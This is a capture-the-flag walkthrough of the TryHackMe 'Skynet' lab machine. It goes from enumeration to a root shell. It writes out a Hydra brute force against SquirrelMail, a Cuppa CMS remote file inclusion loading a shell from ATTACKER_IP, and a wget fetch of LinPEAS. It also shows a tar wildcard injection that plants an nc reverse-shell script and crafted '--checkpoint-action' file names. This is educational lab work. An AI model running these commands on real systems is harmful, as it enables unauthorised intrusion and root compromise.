# TryHackMe Skynet CTF Walkthrough

## Overview

**Machine:** Skynet  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Skills:** Enumeration, SMB, Web Exploitation, Privilege Escalation

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV 10.66.131.136
```

**Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.2p2 |
| 80 | HTTP | Apache 2.4.18 |
| 110 | POP3 | Dovecot |
| 139/445 | SMB | Samba 4.3.11 |
| 143 | IMAP | Dovecot |

---

## Enumeration

### SMB Enumeration

Listed available shares using anonymous access:

```bash
smbclient -L //10.66.131.136 -N
```

Found an accessible anonymous share containing a file `log1.txt` with a list of potential passwords.

Used enum4linux to discover the username `milesdyson`:

```bash
enum4linux -a 10.66.131.136
```

### Web Enumeration

Ran gobuster on the web server:

```bash
gobuster dir -u http://10.66.131.136 -w /usr/share/wordlists/dirb/common.txt
```

Discovered `/squirrelmail` — a webmail login page.

---

## Initial Access

### Brute-Forcing SquirrelMail

Used Hydra with the password list from SMB:

```bash
hydra -l milesdyson -P log1.txt 10.66.131.136 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
```

Successfully logged in and found an email containing new SMB credentials.

### Accessing Miles Dyson's SMB Share

```bash
smbclient //10.66.131.136/milesdyson -U milesdyson
```

Found `important.txt` revealing a hidden web directory: `/45kra24zxs28v3yd/`

### Exploiting Cuppa CMS

Enumerated the hidden directory:

```bash
gobuster dir -u http://10.66.131.136/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt
```

Found `/administrator` running Cuppa CMS. Searched for known exploits:

```bash
searchsploit cuppa
```

Cuppa CMS is vulnerable to Remote File Inclusion (RFI). Exploited it to get a reverse shell:

1. Created a PHP reverse shell and hosted it locally
2. Started a netcat listener: `nc -lvnp 4444`
3. Triggered RFI via the vulnerable parameter:
   ```
   http://10.66.131.136/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://ATTACKER_IP/shell.php
   ```

Obtained a shell as `www-data` and retrieved the user flag.

---

## Privilege Escalation

### Enumeration with LinPEAS

Transferred and ran LinPEAS:

```bash
cd /tmp
wget http://ATTACKER_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS highlighted a cron job running as root every minute:

```
*/1 * * * * root /home/milesdyson/backups/backup.sh
```

The script contained:

```bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

### Tar Wildcard Injection

The wildcard (`*`) in the tar command is exploitable. Created malicious files in `/var/www/html`:

```bash
cd /var/www/html
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 5555 >/tmp/f' > shell.sh
chmod +x shell.sh
touch "/var/www/html/--checkpoint=1"
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
```

Started a listener and waited for the cron job:

```bash
nc -lvnp 5555
```

Received a root shell and retrieved the root flag.

---
